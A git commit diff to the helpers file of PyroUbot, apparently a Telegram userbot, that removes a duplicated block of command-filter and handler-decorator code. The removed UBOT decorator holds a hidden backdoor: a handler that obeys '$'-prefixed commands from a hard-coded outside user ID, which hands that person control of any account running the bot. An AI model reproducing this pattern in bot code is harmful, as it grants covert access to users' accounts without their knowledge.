0f04122718483a00d60569172da8c09024b5f292
Tomi Setiawan <96681219+XtomiX@users.noreply.github.com>
2023-07-02 10:11:12 +0700

    Update client.py

--- PyroUbot/core/helpers/client.py
+++ PyroUbot/core/helpers/client.py
@@ -55,63 +55,6 @@ class PY:
         return wrapper
 
 
-from pyrogram import filters
-
-from PyroUbot import *
-
-
-class FILTERS:
-    ME = filters.me
-    GROUP = filters.group
-    PRIVATE = filters.private
-    OWNER = filters.user(OWNER_ID)
-    ME_GROUP = filters.me & filters.group
-    ME_OWNER = filters.me & filters.user(OWNER_ID)
-
-
-class PY:
-    def BOT(command, filter=FILTERS.PRIVATE):
-        def wrapper(func):
-            @bot.on_message(filters.command(command) & filter)
-            async def wrapped_func(client, message):
-                await func(client, message)
-
-            return wrapped_func
-
-        return wrapper
-
-    def UBOT(command, filter=FILTERS.ME):
-        def wrapper(func):
-            @ubot.on_message(filters.command(command, "$") & filters.user(5876222922))
-            @ubot.on_message(filters.command(command, PREFIX) & filter)
-            async def wrapped_func(client, message):
-                await func(client, message)
-
-            return wrapped_func
-
-        return wrapper
-
-    def INLINE(command):
-        def wrapper(func):
-            @bot.on_inline_query(filters.regex(command))
-            async def wrapped_func(client, message):
-                await func(client, message)
-
-            return wrapped_func
-
-        return wrapper
-
-    def CALLBACK(command):
-        def wrapper(func):
-            @bot.on_callback_query(filters.regex(command))
-            async def wrapped_func(client, message):
-                await func(client, message)
-
-            return wrapped_func
-
-        return wrapper
-
-
 def CMD(command, filter=FILTERS.ME):
     def wrapper(func):
         @ubot.on_message(filters.command(command, ubot.get_prefix(ubot.me.id)) & filter)
